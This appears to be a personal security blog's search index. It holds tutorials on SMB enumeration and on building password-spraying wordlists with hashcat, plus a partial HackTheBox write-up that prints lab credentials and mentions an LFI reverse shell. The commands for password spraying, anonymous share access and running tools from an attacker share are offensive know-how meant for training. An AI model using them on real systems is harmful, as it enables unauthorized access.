[{"categories":["hacking","oscp"],"content":"What is SMB? Info Server Message Block (SMB) SMB has a pretty bad rep in regards to security espically with the recent, 2017, infamous exploit EternalBlue CVE-2017-0144. But how can you find it, exploit it, and even use it to help with a red team engagement? Lets find out. ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:0:0","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"Enumerating Before you can do anything you need to discover shares on the network. From here you can try to see if any shares allow anonymous access or what restricted share exists. SMB can also disclose information about the host such as the operating system and current version. ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:1:0","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"nmap we can use nmap to scan across a network to try discover hosts with port 139 which is for the NetBIOS protocol which is a session layer allowing computers on a local network to talk with one another and port 445 for SMB. Note It should be noted that SMB can work without NetBIOS but it is usually enabled for backwards compatibility. We’ve been tasked to complete a peneration test on the /24 network located at 10.10.10.1 using nmap to find smb will look like this: nmap -p 139,445 10.10.10.1/24 This will return back a list of hosts that have those ports open. ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:1:1","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"Discovering file sharing Now we have a list of hosts with shares lets see if we can access them via anonymous sessions. smbmap smbmap is a great tool for listing out different shares on an SMB server to do so is as easy as passing it the IP address of the host. smbmap -H 10.10.10.23 [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.23... [+] IP: 10.10.10.23:445 Name: hack.me Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC Users READ, WRITE From this output we can see there exists several shares, ADMIN, C, IPC and Users. We can see via our anonymous access, we never gave smbmap a username and password, that we have read and write access to the Users share. smbmap supports loads more features including specifying usernames and passwords and even executing commands! smbclient Another tool I really like to use is smbclient which is part of the fantastic impacket library. To list share it’s as simple as this: echo exit | smbclient -L 10.10.10.23 Note Piping exit to smb client closes the password request as we’re only looking for anonymous sessions at the moment You should recieve an output similar to smbmap. Again smbclient has many more features than just listing the shares. We will use it further on in this article for actually connecting to the share and interacting with it. ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:1:2","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"Discovering SMB vulnrabilties nmap cameo appearence There’s a wealth of vulnrabilites with SMB and a lot of imformation out there on what version has which exploit. To quickly discover potentially exploits I like two methods. Searchsploit Searchsploit is a handy little cli tool. Passing searchsploit a software and a version will return a list of known exploits. searchsploit smb 2.1 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- MikroTik RouterOS \u003c 6.41.3/6.42rc27 - SMB Buf | hardware/remote/44290.py ---------------------------------------------- --------------------------------- Shellcodes: No Results A feature I love is ability to quickly mirror the result to my working directory. In the above snippet I an see a python file has been found. I can quickly copy it with the -m flag or if I want to quickly examine it -x. searchspoit -m 44290 nmap scripting engine Using nmaps scripting engine we can have it run scripts in hopes to discover potential vulnrabilties and get a wealth of information on them. Using a * is a good trick here to run all scripts related to smb vulns. nmap -p 139,445 --script smb-vuln* 10.10.10.23 Warning We should avoid the usage of the unsafe=1 flag with nmap as it’s almost guerenteed to cause the host to crash. ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:1:3","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"Gaining access If I find some creds in LDAP or via someother means and prehaps some potential users names. Which could be found from company email address or looking on website such as linked in for employees of a company. We could create a username and password lists. Using crackmapexec I can quickly spray all permutations of usernames and passwords to see if i can gain authenticated access to shares. crackmapexec smb 10.10.10.23 -u user.list -p password.list ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:2:0","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"Interacting with a SMB share As privously mentioned smbclient has additional features those include actually interacting with shares. smbclient \\\\\\\\10.10.10.23\\\\Users smb:\\\u003e I can now use normal commands such as cd ls and get to download a remote file or put to upload a file from my working directory to the share. ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:3:0","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"Using your own SMB share to transfer files to a windows host Okay, you’ve establised a foothold on a windows machine and now you want to copy over your tools such as winPEAS to discover low hanging fruit that could esculate our privileges. We can use the hosts cmd.exe copy command to grab files from our own share. impacket comes with it’s own smbserver. Lets create a share on our Kali machine by spesifying the share name and the directory to mount to it. smbserver EvilShare /opt/tools Now lets copy over winPEAS from the share where the IP address is the IP of our Kali machine. C:\\\u003e copy \\\\10.10.11.2\\EvilShare\\winPEAS.exe . We can also directly execute the binary straight from the share. C:\\\u003e \\\\10.10.11.2\\EvilShare\\winPEAS.exe ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:4:0","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking","oscp"],"content":"In Summary SMB might not always be exploitable but it can still be a power tool for not only extracting data from a host but we can also use it for transfering our own data from our local machine to a windows host. I think you should always get excited if you see smb is open on a machine and it is always a good place to start enumerating futher. I hope this post helps facilitate that. ","date":"2020-06-26","objectID":"/smb-enumeration-interaction/:5:0","tags":["exploits","pivoting","pen-testing","metasploit"],"title":"SMB Enumeration \u0026 Interaction","uri":"/smb-enumeration-interaction/"},{"categories":["hacking"],"content":"Create a custom password list for use with tools such as smb_login and hydra","date":"2020-04-05","objectID":"/hashcat-gen-passwords/","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"Let’s use hashcat to generate a custom word-list we can make use of with password spraying attacks. Users typically have passwords that have a set pattern, such as if a company has a policy of resetting passwords monthly it is not surpring to find that users have their password contain the current Month of the year. Prehaps a companies password policy is longer you could then expect users to use seasons as part of their password. Lets start with quickly adding all the months into a “candidate” file we can do this with a quick python one-liner. python -c \"import calendar;[print(calendar.month_name[i]) for i in range(1,13)]\" \u003e candidate.passwords Lets go ahead and add some more common passwords vim candidate.passwords Our wordlist January February March April May June July August September October November December Password P@ssw0rd Secret 123456 123456789 qwerty 111111 12345678 abc123 1234567 password1 12345 iloveyou monkey dragon At this point you’ll want to add that extra spice to this list by doing some OSINT on your target. Adding things such as the company name, or even the name of the technology/tool you are trying to break into. Additional using a tool like CeWL is great for pulling lots of data from a website and generating an even bigger wordlist. Lets add even more entropy to our new password list by adding the year to the end of each candidate password and then an ! to the end of each potential passwords. ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:0:0","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"Add the year to end of each password for i in $(cat candidate.passwords); do echo $i; echo ${i}2020; done \u003e tmp; cp tmp candidate.passwords ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:1:0","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"Add an ! to end of each password for i in $(cat candidate.passwords); do echo $i; echo ${i}\\!; done \u003e tmp; cp tmp candidate.passwords Finally to really add some randomness to our custom list we can use hashcat and some rule files to generate thousands of variants of our candidate passwords. To do so we use the --stdout flag in hashcat to print the output to, surprisingly, standout. One of the great features of hashcat is the ability to use a rule file to generate variance. This is done by giving setting the -r flag and a path to your rule file. You can find lots of rule files in the hashcat github repo but for this example we will just use the best64.rule ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:2:0","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"Lets quickly download the rules with wget wget https://raw.githubusercontent.com/hashcat/hashcat/master/rules/best64.rule Now lets apply our rules with hashcat. Notice --force flag to ensure hashcat runs even with a CPU. hashcat --force --stdout candidate.passwords -r best64.rule \u003e password.list We should now have thousands of words in this password list now. We can can go futher and even change additional rule files to get even more variants on what started out as simply the months of the year and some common passwords. We now have thousands of passwords which is too many for a password spraying attack. We can use bash to cut down on some of the fat. ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:3:0","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"Fine tuning the list ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:4:0","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"Remove duplicate passwords cat password.list | sort -u \u003e tmp; cp tmp password.list ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:4:1","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"Keep passwords that are over a certain length cat password.list | awk 'length($0) \u003e 7' \u003e tmp; cp tmp password.list Now we have prepared our password list before using it we should check the password policy. Just incase we block a user out of their account due to too many failed authentication attempts. If we were attack a windows machine we can use crackmapexec to check the password policy for a SMB share. crackmapexec smb 192.168.1.25 --pass-pol If that does not work you can try a null authentication, this tends to work on windows servers that have been upgraded from 2003. This is due for new domain installations not allowing by default null authentication. crackmapexec smb 192.168.1.25 --pass-pol -u '' -p '' CMB 192.168.1.25:445 DOMAIN [*] Windows 10.0 Build 14393 (name:DOMAIN) (domain:FOO) CMB 192.168.1.25:445 DOMAIN [+] Dumping password policy CMB 192.168.1.25:445 DOMAIN Minimum password length: 7 CMB 192.168.1.25:445 DOMAIN Password history length: 24 CMB 192.168.1.25:445 DOMAIN Maximum password age: 42 days 23 hours 52 minutes CMB 192.168.1.25:445 DOMAIN Minimum password age: 23 hours 52 minutes CMB 192.168.1.25:445 DOMAIN Account lockout threshold: 0 CMB 192.168.1.25:445 DOMAIN Account lockout duration: None Things to look out for in the output would be the minimum password length, we could use this to tune our password list and the information on account lockouts. Which in the above example is set to 0 hence we are safe to spray our passwords without the fear of locking out users. You are now ready to begin your attack. In the case of windows SMB you could use either: crackmapexec crackmapexec smb 192.168.1.25 -u user.list -p password.list or metasploit console has a nice module called smb_login. There is many ways you could expand this further to create more precise wordlists against your target. Doing good recon on a target can yeild some great potential passwords, such as including user names, birthdays. Obviously there is infinite possibilites but these techniques can be used to quickly generate at least some of those infinite possibilites. ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:4:2","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking"],"content":"References ippsec - forest ","date":"2020-04-05","objectID":"/hashcat-gen-passwords/:5:0","tags":["security","password","cracking","bash","hashcat","OSINT"],"title":"Using Hashcat and a bit of Bash to generate password lists","uri":"/hashcat-gen-passwords/"},{"categories":["hacking","writeups"],"content":"write up for friendzone on HackTheBox a rank easy linux box.","date":"2019-07-11","objectID":"/friendzone/","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"HTB Writeup: friendzone ","date":"2019-07-11","objectID":"/friendzone/:0:0","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"Introduction Friendzone was my third box to own on HackTheBox. I learnt alot from this box. Such as exploiting Local File Inclusion (LFI) to have PHP execute my reverse shell, to understanding more about DNS and the ways python imports libraries. ","date":"2019-07-11","objectID":"/friendzone/:1:0","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"Enumeration ","date":"2019-07-11","objectID":"/friendzone/:2:0","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"nmap Running nmap on a server will give a lot of information on what ports are open on the machine and what services those ports belong to. nmap -sS -sC -sV -oA friendzone -p- -T4 10.10.10.123 From running the above command we see the following services and ports running on friendzone. ftp 21 ssh 22 domain 53 http 80 samba 139 https 443 samba 445 ","date":"2019-07-11","objectID":"/friendzone/:2:1","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"Looking into the samba share. Kali comes with a great tool smbmap for doing recon on samba shares. smbmap -H 10.10.10.123 Running it we get this result. root@kali:~# smbmap -H 10.10.10.123 [+] Finding open SMB ports.... [+] Guest SMB session established on 10.10.10.123... [+] IP: 10.10.10.123:445 Name: administrator1.friendzone.red Disk Permissions ---- ----------- print$ NO ACCESS Files NO ACCESS general READ ONLY Development READ, WRITE IPC$ This tells use we have read only access to general and can read and write to Development. Lets start of by seeing what can be found in general. To do this I used smbclient on kali: smbclient //10.10.10.123/general When prompted for a password you can just hit enter and get a smb shell. Hitting ls there is a file called creds.txt lets grab that with get creds.txt putting it onto the local machine and using cat to read it we get: creds for the admin THING: admin:WORKWORKHhallelujah@# Lets have a quick look into Development using the same smbclient command as before and see if there is anything interesting. It just contains rubbish but lets remember for the future we can write to this directory and that can be incredible useful for exploitation. ","date":"2019-07-11","objectID":"/friendzone/:2:2","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"The Website So we have admin credential that do not work for ssh so maybe the website contains. I used dirb which is a peice of software that takes a list of common urls and trys them against a target. Dirb proved to not find anything other than a mocking robots.txt and an index page: /index.html That is when I remembered the server was running a DNS service… ","date":"2019-07-11","objectID":"/friendzone/:2:3","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"Digging through DNS. DNS is the service that resolves a human readable website url such as www.google.com to an ip address. Thanks to ippsec1 video were he uses a range of tools to enumerate DNS. The only command he used that was any use was dig. Running: dig axfr friendzoneportal.red @10.10.10.123 Getting the domain friendzoneportal.red from the home page email address returns: root@kali:~/HTB/FriendZone# dig axfr friendzoneportal.red @10.10.10.123 ; \u003c\u003c\u003e\u003e DiG 9.11.5-P4-3-Debian \u003c\u003c\u003e\u003e axfr friendzoneportal.red @10.10.10.123 ;; global options: +cmd friendzoneportal.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 friendzoneportal.red. 604800 IN AAAA ::1 friendzoneportal.red. 604800 IN NS localhost. friendzoneportal.red. 604800 IN A 127.0.0.1 admin.friendzoneportal.red. 604800 IN A 127.0.0.1 files.friendzoneportal.red. 604800 IN A 127.0.0.1 imports.friendzoneportal.red. 604800 IN A 127.0.0.1 vpn.friendzoneportal.red. 604800 IN A 127.0.0.1 friendzoneportal.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 28 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Thu Jul 11 15:17:22 BST 2019 ;; XFR size: 9 records (messages 1, bytes 309) admin.friendzoneportal.red Great! we have found the admin page. Lets update our /etc/hosts file to use these new domains. Unfortuantly you cannot use the servers dns service as they all resolve to localhost. Initially visiting admin.friendzoneportal.red just shows the same index page. So lets try https Excellent we have a login form but when we log in we are just told Admin page is not developed yet !!! check for another one so more digging is required. Checking the SSL certificate from the website can see the issue is from a friendzone.red lets run dig again but this time zone transfer without the portal in the domain. root@kali:~/HTB/FriendZone# dig axfr friendzone.red @10.10.10.123 ; \u003c\u003c\u003e\u003e DiG 9.11.5-P4-3-Debian \u003c\u003c\u003e\u003e axfr friendzone.red @10.10.10.123 ;; global options: +cmd friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red. 604800 IN AAAA ::1 friendzone.red. 604800 IN NS localhost. friendzone.red. 604800 IN A 127.0.0.1 administrator1.friendzone.red. 604800 IN A 127.0.0.1 hr.friendzone.red. 604800 IN A 127.0.0.1 uploads.friendzone.red. 604800 IN A 127.0.0.1 friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 25 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Thu Jul 11 16:01:52 BST 2019 ;; XFR size: 8 records (messages 1, bytes 289) Update /etc/hosts and visit https://administrator1.friendzone.red /index.html Login using the username and password from creds.txt we got earlier from the samba share. On logging in we are told to visit /dashboard.php ","date":"2019-07-11","objectID":"/friendzone/:2:4","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"Exploiting the LFI. ","date":"2019-07-11","objectID":"/friendzone/:3:0","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":["hacking","writeups"],"content":"References ippsec [2]:http://pentestmonkey.net/tools/web-shells/php-reverse-shell php-reverse-shell ","date":"2019-07-11","objectID":"/friendzone/:5:0","tags":["HackTheBox"],"title":"Friendzone","uri":"/friendzone/"},{"categories":[],"content":"\"H3110_W0r1d\"","date":"2019-07-10","objectID":"/hello-world/","tags":[],"title":"\"H3110_W0r1d\"","uri":"/hello-world/"},{"categories":[],"content":"So I have started a blog. Here you should find write ups on CTFs and machines on HackTheBox and my experiences in the industry as try to improve my skills in cyber security. I want to start documenting and recording things I learn to help others but also to serve as notes for myself. I’m just starting out and very much a noob so do not expect too much. – Sam ","date":"2019-07-10","objectID":"/hello-world/:1:0","tags":[],"title":"\"H3110_W0r1d\"","uri":"/hello-world/"},{"categories":null,"content":"hello","date":"0001-01-01","objectID":"/about/","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"I’m Sam - a budding hacker that likes to build technology and break it. ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":" SUBway Info CLI tool for subdomain discovery Enumerate subdomains by either using DNS lookup or by virtual hosting HTTP requests. Useful for things like Hack The Box or Try Hack Me when no DNS server is available. vhost lookups as simple as supply a list of domains and the IP. subway -h example.com -w subdomains.txt -v -ip 127.0.0.1 ==================================== ______ _____ / __/ / / / _ )_ _____ ___ __ _\\ \\/ /_/ / _ | |/|/ / _ '/ // / /___/\\____/____/|__,__/\\_,_/\\_, / /___/ ==================================== host: example.com wordlist: subdomains.txt ==================================== www.example.com wild.example.com mail.example.com server.example.com dev1.example.com 100:100 done Includes features to filter out reponses of certain length or filter out reponse codes. Gissue Info A CLI for managing GitHub issues in your project Gissue is a CLI program for managing your Github issues for your project in the command line. It allows you to view all issues in a project and create new issues all without leaving your comfy terminal session. Shell-Search Info Quickly search google and open your browser window from the command line. I think I spend more time reading Stackoverflow than I do writing code in my text editor. When I’m working I always have three things open - VScode, a web browser and a terminal. I write my code go to my terminal run it and if an error pops up I am unfamilar with to my web browser I go in the hopes of finding a stackoverflow question that fufills my needs. The annoying part of all this, I have to tab over to my browser open another tab, you can’t have too many tabs open, and enter my query. I wanted to streamline this ever so dedious process. I had recently been learning a bit of Javascript and thought I would have ago and writing a command line program that I can type my query into hit enter the browser googles that query for me and makes it my active window. Shell-search is easy to use. Install it (instructions are on the github) and issue a search with search \u003cquery here\u003e ","date":"0001-01-01","objectID":"/projects/:0:0","tags":null,"title":"Projects","uri":"/projects/"}]